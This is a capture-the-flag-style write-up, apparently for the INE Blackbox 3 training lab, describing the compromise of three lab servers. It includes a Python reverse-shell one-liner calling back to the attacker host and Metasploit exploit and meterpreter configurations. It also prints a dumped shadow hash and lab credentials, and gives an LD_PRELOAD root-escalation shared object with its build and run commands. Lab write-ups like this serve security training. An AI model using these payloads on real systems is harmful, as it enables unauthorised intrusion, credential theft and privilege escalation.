# INE Blackbox 3

- Our machine: 192.246.198.2

## Enumeration 1:

- Target: server1.ine.local = 192.246.198.3

- Nmap: `nmap -sT -P0 192.246.198.3` ---> Port 80 opens.

- Go to the server on our browser you will see a message: `Debugger has turned on.  Please visit /console for the debugger`

- Go to 192.246.198.3/console ---> You can run Python code on this.

- I use payload:

```python3
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.246.198.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

- ** Alternatively ** You can exploit this server using Metasploit's `exploit/multi/http/werkzeug_debug_rce` to gain a direct Meterpreter

- We can't use msfvenom to craft a payload to upgrade our shell. Instead, background the current shell session by using Ctrl+Z. Then search for `shell_to_meterpreter` module. Set the SESSION option to 1 (which is our reverse shell) ---> Run and we receive the upgraded meterpreter shell on session 2.

- Next I tried to move on to the second machine but can't exploit MySQL. Hmm maybe we still have some information in the first machine we can further exploit.

- Some interesting post exploitation module for linux can be found here https://www.infosecmatter.com/post-exploitation-metasploit-modules-reference/. I used: (please use more if you're actually exploiting targets)

```
post/linux/gather/enum_system	
post/linux/gather/enum_users_history	
```

- Nothing interesting in enum_system, you can see a bunch of users.

- When enumerating user history, notice that we can see user history of user `auditor`:

```
[+] bash history for auditor stored in /root/.msf4/loot/20220113024628_default_192.246.198.3_linux.enum.users_769960.txt
```

- Let's have a look. If you look through the log, there are some interesting information:

```
mysql -h 192.246.198.4 -u root -pfArFLP29UySm4bZj
bin/mysqladmin -u root password 'new-password'
```

- Hey, 192.246.198.4 is our second target! And with a Nmap scan, it's only a database server. Let's connect to it using `root:pfArFLP29UySm4bZj`

# Enumeration 2

- I tried manually enumerating this mysql server but nothing prevails. 

- Looking into exploiting with Metasploit to somehow gain a shell.. Hmm.

- Some failed attempts but eventually you need to use this module:

```
22  exploit/multi/mysql/mysql_udf_payload  2009-01-16  excellent  No   Oracle MySQL UDF Payload Execution
```

```

```

- Actually my Hera lab instance failed and giving weird bug so I refreshed it. 

- ACTUALLY I noticed the correct credential should be `fArFLP29UySm4bZj` without the first letter `p`....

- We FOUND the flag in /root/flag.txt: `4c537c0dfd18bafdcd59f53c7015550e`

# Enumeration 3

- Nmap-ing server3.ine.local:

```
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```

- Let's go to our browser to have a look. Dirb this webserver!

```

```

- Go to docs we foundout they are using `tomcat 8.0.53`. I tried using `exploit/multi/http/tomcat_jsp_upload_bypass` but it wasn't working.

- Next I use `auxiliary/scanner/http/tomcat_mgr_login` set RHOSTS to `server3.ine.local`.

- Found the credentials of `tomcat:s3cret`

- Now we exploit the WAR upload function of Tomcat Manager. We use `exploit/multi/http/tomcat_mgr_upload`:

```
Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting    Required  Description

   HttpUsername  tomcat             no        The username to authenticate as
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        server3.ine.local  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         8080               yes       The target port (TCP)

   TARGETURI     /manager           yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                            no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.246.198.2    yes       The listen address (an interface may be specified)
   LPORT  7777             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal
```

- FLAG1 is at /opt/tomcat: `EBCFE35ACC27E0EA91CF3A5AB600BABE`

- cat /etc/shadow gives us: `robert:$6$D4O99Z5L$Q38CW.ym42GmIbjZRh8DA2rtLHxXgMj.ahVbrBrbWvuBXmP555cGuLG1hkQE1R0eQVX48Rs7yecdU7V96u5Tf0:17822::::::`

- Enumerating the tomcat's `conf` folder we can see `conf.tar.gz`. `tar -xf conf.tar.gz; cd conf; cat tomcat-users.xml` we can see robert's password. (OR we could have crack the password hash)

- `robert:robert@1234567890!@#`

- Now we ssh to the machine! FLAG2: `EC2986081E84BB845541D5CC0BEE13B3`

- We spawn a TTY shell: `python -c 'import pty; pty.spawn("/bin/sh")'`

- By using `sudo -l` we know that robert can use `ls` as root. `ls /root` shows that there is a third flag FLAG3

- Also `env_keep+=LD_PRELOAD` is present! Time to escalate some privilege.

- Write shell.c with vim with the following content:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```

- Then compile it using: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

- Finally: `sudo LD_PRELOAD=/home/robert/shell.so ls`

- FLAG3: `560648FC63F090A8CF776326DC13FAC7`
